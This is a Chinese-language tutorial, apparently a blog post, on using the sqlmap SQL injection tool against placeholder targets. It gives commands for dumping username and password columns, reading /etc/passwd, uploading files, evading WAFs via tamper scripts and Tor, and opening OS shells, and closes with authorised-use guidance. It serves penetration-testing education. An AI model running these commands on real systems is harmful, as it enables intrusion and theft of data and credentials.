+++
date = '2026-04-18T16:52:15Z'
draft = false
title = 'Sqlmap教程'
categories = ["工具手册"]
tags = ["sqlmap", "SQL注入", "工具"]
+++

# Sqlmap 完全指南：自动化 SQL 注入测试工具

## 什么是 Sqlmap？

Sqlmap 是一个开源的渗透测试工具，用于自动化检测和利用 SQL 注入漏洞。它支持多种数据库管理系统（DBMS），包括：

- MySQL
- PostgreSQL
- Microsoft SQL Server
- Oracle
- SQLite
- Microsoft Access
- IBM DB2
- 等等

**主要特性：**
- 完全支持六种 SQL 注入技术：布尔盲注、时间盲注、报错注入、联合查询注入、堆叠查询注入、带外注入
- 支持直接连接数据库（通过提供 DBMS 凭证、IP 地址、端口和数据库名称）
- 支持枚举用户、密码哈希、权限、角色、数据库、表和列
- 支持自动识别密码哈希格式并支持使用字典破解
- 支持下载和上传文件
- 支持在数据库服务器上执行任意命令并获取标准输出

## 安装 Sqlmap

### Linux/macOS 安装

```bash
# 使用 Git 克隆仓库
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git

# 进入目录
cd sqlmap

# 运行 Sqlmap
python sqlmap.py -h
```

### Windows 安装

1. 安装 Python（推荐 Python 3.x）
2. 下载 Sqlmap：`git clone https://github.com/sqlmapproject/sqlmap.git`
3. 打开命令提示符，进入 sqlmap 目录
4. 运行：`python sqlmap.py -h`

### 使用包管理器安装

```bash
# Kali Linux（预装）
sudo apt update
sudo apt install sqlmap

# Arch Linux
sudo pacman -S sqlmap

# macOS (Homebrew)
brew install sqlmap
```

## 基本使用

### 1. 检测 SQL 注入漏洞

```bash
# 基本检测
python sqlmap.py -u "http://example.com/page.php?id=1"

# 指定参数
python sqlmap.py -u "http://example.com/page.php" --data="id=1&name=test"

# 使用 POST 请求
python sqlmap.py -u "http://example.com/login.php" --data="username=admin&password=test" --method POST
```

### 2. 获取数据库信息

```bash
# 获取当前数据库
python sqlmap.py -u "http://example.com/page.php?id=1" --current-db

# 获取所有数据库
python sqlmap.py -u "http://example.com/page.php?id=1" --dbs

# 获取当前用户
python sqlmap.py -u "http://example.com/page.php?id=1" --current-user

# 获取数据库版本
python sqlmap.py -u "http://example.com/page.php?id=1" --banner
```

### 3. 枚举数据库内容

```bash
# 枚举指定数据库的所有表
python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name --tables

# 枚举指定表的所有列
python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name -T table_name --columns

# 转储表数据
python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump

# 转储特定列
python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name -T table_name -C "username,password" --dump
```

## 高级功能

### 1. 绕过 WAF（Web 应用防火墙）

Sqlmap 提供了多种绕过技术：

```bash
# 使用随机 User-Agent
python sqlmap.py -u "http://example.com/page.php?id=1" --random-agent

# 使用代理
python sqlmap.py -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# 使用 Tor 网络
python sqlmap.py -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5

# 使用 tamper 脚本（编码/混淆 payload）
python sqlmap.py -u "http://example.com/page.php?id=1" --tamper=space2comment

# 常用 tamper 脚本：
# - space2comment: 用 /**/ 替换空格
# - between: 用 NOT BETWEEN 0 AND # 替换大于号
# - charencode: URL 编码
# - randomcase: 随机大小写
# - space2randomblank: 用随机空白字符替换空格
```

### 2. 文件操作

```bash
# 读取服务器文件
python sqlmap.py -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"

# 写入文件到服务器
python sqlmap.py -u "http://example.com/page.php?id=1" --file-write="local.txt" --file-dest="/tmp/remote.txt"

# 上传文件
python sqlmap.py -u "http://example.com/page.php?id=1" --file-upload="local.txt" --file-dest="/tmp/remote.txt"
```

### 3. 执行操作系统命令

```bash
# 执行命令（需要数据库权限）
python sqlmap.py -u "http://example.com/page.php?id=1" --os-cmd="whoami"

# 获取交互式 shell
python sqlmap.py -u "http://example.com/page.php?id=1" --os-shell

# 执行 PowerShell 命令（Windows）
python sqlmap.py -u "http://example.com/page.php?id=1" --os-powershell
```

### 4. 暴力破解

```bash
# 暴力破解表名
python sqlmap.py -u "http://example.com/page.php?id=1" --common-tables

# 暴力破解列名
python sqlmap.py -u "http://example.com/page.php?id=1" --common-columns

# 使用自定义字典
python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name --tables --common-tables
```

## 实用技巧

### 1. 提高检测速度

```bash
# 使用线程
python sqlmap.py -u "http://example.com/page.php?id=1" --threads=10

# 跳过启发式检测
python sqlmap.py -u "http://example.com/page.php?id=1" --skip-heuristics

# 只测试 GET/POST 参数
python sqlmap.py -u "http://example.com/page.php?id=1" -p "id"
```

### 2. 保存和恢复会话

```bash
# 保存会话
python sqlmap.py -u "http://example.com/page.php?id=1" --save="session.sqlite"

# 恢复会话
python sqlmap.py -s "session.sqlite"

# 批量扫描
python sqlmap.py -m "targets.txt"
```

### 3. 输出格式

```bash
# 详细输出
python sqlmap.py -u "http://example.com/page.php?id=1" -v 3

# 输出级别：
# 0: 只显示 Python 错误和严重信息
# 1: 显示信息和警告
# 2: 显示调试信息
# 3: 显示 payload
# 4: 显示 HTTP 请求
# 5: 显示 HTTP 响应头
# 6: 显示 HTTP 响应页面

# 保存输出到文件
python sqlmap.py -u "http://example.com/page.php?id=1" --output-dir="/tmp/sqlmap_output"
```

## 实战示例

### 示例 1：检测并利用 SQL 注入

```bash
# 1. 检测漏洞
python sqlmap.py -u "http://vulnerable-site.com/product.php?id=1"

# 2. 获取数据库信息
python sqlmap.py -u "http://vulnerable-site.com/product.php?id=1" --dbs

# 3. 选择目标数据库
python sqlmap.py -u "http://vulnerable-site.com/product.php?id=1" -D app_db --tables

# 4. 查看用户表
python sqlmap.py -u "http://vulnerable-site.com/product.php?id=1" -D app_db -T users --columns

# 5. 转储用户数据
python sqlmap.py -u "http://vulnerable-site.com/product.php?id=1" -D app_db -T users -C "username,password,email" --dump
```

### 示例 2：绕过 WAF 进行测试

```bash
# 使用多个绕过技术
python sqlmap.py -u "http://waf-protected-site.com/search.php" \
  --data="query=test" \
  --random-agent \
  --tamper="space2comment,between,charencode" \
  --delay=1 \
  --timeout=30 \
  --retries=3 \
  --level=5 \
  --risk=3
```

## 安全注意事项

### 合法使用
- **仅用于授权测试**：Sqlmap 只能用于你有权限测试的系统
- **遵守法律法规**：未经授权的测试可能违法
- **获取书面授权**：在测试生产环境前必须获得书面授权

### 道德准则
1. **最小化影响**：避免对目标系统造成损害
2. **数据保护**：不要泄露或滥用获取的数据
3. **及时报告**：发现漏洞后及时向相关方报告
4. **删除数据**：测试完成后删除获取的敏感数据

## 常见问题解答

### Q1: Sqlmap 检测不到注入点怎么办？
- 尝试使用 `--level` 和 `--risk` 参数提高检测级别
- 使用 `--tamper` 脚本绕过过滤
- 检查是否需要在 Cookie 或 User-Agent 中注入
- 尝试不同的注入点（POST 参数、HTTP 头等）

### Q2: 如何提高 Sqlmap 的速度？
- 使用 `--threads` 参数增加线程数
- 使用 `--batch` 参数自动选择默认选项
- 限制测试的参数范围 `-p`
- 使用 `--skip` 跳过不必要的测试

### Q3: Sqlmap 支持哪些认证方式？
- HTTP 基本认证：`--auth-type=BASIC --auth-cred="user:pass"`
- HTTP 摘要认证：`--auth-type=DIGEST --auth-cred="user:pass"`
- NTLM 认证：`--auth-type=NTLM --auth-cred="DOMAIN\user:pass"`
- Cookie 认证：`--cookie="PHPSESSID=abc123"`

## 总结

Sqlmap 是安全测试人员必备的工具之一，它极大地简化了 SQL 注入漏洞的检测和利用过程。然而，强大的工具需要负责任的使
用。请始终：

1. **遵守法律和道德规范**
2. **仅在授权范围内使用**
3. **保护测试中获取的敏感信息**
4. **及时报告发现的漏洞**

通过掌握 Sqlmap，你不仅可以提高安全测试的效率，还能更好地理解 SQL 注入漏洞的原理和防御方法。

---

**更新日期**：2026-04-18  
**适用版本**：Sqlmap 1.7+  
**测试环境**：Kali Linux 2026.1, Python 3.11+